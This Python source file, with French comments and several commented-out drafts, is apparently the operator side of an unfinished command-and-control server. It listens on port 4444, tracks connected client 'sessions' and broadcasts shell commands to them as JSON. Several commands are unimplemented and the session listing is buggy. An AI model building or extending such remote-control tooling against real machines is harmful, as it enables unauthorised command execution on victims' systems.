import socket, asyncio
from aioconsole import ainput
import subprocess
import json
import uuid

# {"command": "ps",
#   "args": {
#     "args": [],
#     "otp": "",
#     "url": ""
    
#   }
# }
async def pmsg(message):
    # Effacer la ligne actuelle (où se trouve le curseur d'input)
    print(f"\r{message}\n> ", end="", flush=True)

cmd_list = ["cmd", "ps", "dl", "help", "sessions"]



clients = {}
def gen_client(reader, writer):
    id = "session-" + str(uuid.uuid4())
    clients[id] = {
        'reader': reader,
        'writer': writer
        
                   }
    return id


async def interpreter(cmd):
    print("cmd written:",cmd)
    
    cmd_found = False
    cmd = cmd.split(" ")
    
    cmd_name = cmd[0]

    for x in  cmd_list:
        if x == cmd_name:
            cmd_found= True
            break
    
    if not cmd_found:
        print("[x] ERROR: COMMAND NOT FOUND, TYPE 'help' FOR MORE INFOS")
        return -1
    
    match cmd_name:
        case "cmd":
            args = cmd[1:]
            print(args) 
            final = {}
            final["command"] = "cmd"
            final["args"] = args
            return json.dumps(final, separators=(',', ':'))
        case "sessions":
            for sid in list(clients):
                print(clients[sid])
                return 1





# def serveur():

#     ip = "localhost"  # Écoute sur toutes les interfaces
#     port = 4444  # Le port sur lequel le serveur écoute

#     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     server.bind((ip, port))
#     server.listen(5)
#     print(f"[*] Écoute sur {ip}:{port}")

#     client_socket, addr = server.accept()
#     print(f"[+] Connexion acceptée de {addr[0]}:{addr[1]}")

#     while True:
#         command = input("> ")
#         if command.lower() == 'exit':
#             break
        
#         # Envoyez la commande au client
#         print(await interpreter(command))
#         client_socket.send(str.encode(await interpreter(command)))

#         # Recevez le résultat de la commande
#         response = client_socket.recv(4096)
#         print(f"reponse {response.decode()}", end="")

#     client_socket.close()

# if __name__ == '__main__':
#     serveur()


async def handle_commands():
    req = None
    while True:
        command = await ainput("> ")
        if command.lower() == 'exit':
            break

        interpreted_command = await interpreter(command)
        
        
        if interpreted_command != -1 and interpreted_command !=1:
            
            for session_id in list(clients):
                writer = clients[session_id]['writer']
                reader = clients[session_id]['reader']

                # Envoyez la commande au client
                writer.write(str.encode(interpreted_command, 'utf-8'))
                await writer.drain()

                try:
                    # Recevez le résultat de la commande
                    res = await reader.read(255)
                    print(f"Response from {session_id}: {res.decode()}", end="")
                except asyncio.IncompleteReadError:
                    print(f"Connection lost with {session_id}.")
                    del clients[session_id]




async def handle_client(reader, writer):
    client_info = writer.get_extra_info('peername')
    await pmsg(f"[+] New connection from {client_info} !n")
    sid = gen_client(reader, writer)
    try:
        while True:
            data = await reader.read(1024)  # Taille de buffer ajustable selon les besoins
            if not data:
                # Aucune donnée reçue signifie que le client a fermé la connexion
                await pmsg(f"Connection closed by {client_info}")
                break

            message = data.decode()
            await pmsg(f"Received from {sid}: {message}")

            # Ici, vous pouvez ajouter une logique pour répondre aux messages des clients si nécessaire

    except asyncio.CancelledError:
        # Gérer ici une annulation de tâche si nécessaire
        pass
    finally:
        await pmsg(f"Closing connection with {client_info}")
        writer.close()
        await writer.wait_closed()
        del clients[sid]  # Supprimez la session du client du dictionnaire
    # req = None

    # while True:
    #     command = await ainput("> ")
    #     if command.lower() == 'exit':
    #         break
        
    #     # Envoyez la commande au client
    #     print(await interpreter(command))
    #     if await interpreter(command()) != -1:
    #         writer.write(str.encode(await interpreter(command), 'utf8'))

    #         # Recevez le résultat de la commande
    #         res =  (await reader.read(255)).decode('utf8')
    #         print(f"reponse {res.decode()}", end="")
    #         await writer.drain()
    # writer.close()

# async def run_serv():
#     print("Starting asynchronous server...")
#     server = await asyncio.start_server(handle_client, '127.0.0.1', 4444)
#     print("Server succesfuly started, waiting for clients...")

#     async with server:
#         await server.serve_forever()
#         print("finished")

async def run_serv():
    print("Starting asynchronous server...")
    server_task = asyncio.create_task(asyncio.start_server(handle_client, '127.0.0.1', 4444))
    commands_task = asyncio.create_task(handle_commands()) 
    await server_task

    try:
        # Exécuter les deux tâches en parallèle (serveur et commandes)
        await asyncio.gather(server_task, commands_task)
    except asyncio.CancelledError:
        # Gérer ici une annulation de tâche si nécessaire
        pass
    finally:
        print("Server shutdown.")



asyncio.run(run_serv())


# async def handle_client(reader, writer):
#     req = None
#     while req != 'quit':
#         req = (await reader.read(255)).decode('utf8')
#         print(f"receive '{req}'")
#         if req == 'ping':
#             res = "pong !" + '\n'
#             print("sending pong")
#             writer.write(res.encode('utf8'))
#             print("pong sent")
#             # ensure that data has been sent, and then flushes StreamReader buffer
#             await writer.drain()
#     writer.close()





# async def run_serv():
#     print("Starting server...")
#     server = await asyncio.start_server(handle_client, '127.0.0.1', 4444)
#     print("Server succesfuly started, waiting for clients...")

#     async with server:
#         await server.serve_forever()
#         print("finished")


# asyncio.run(run_serv())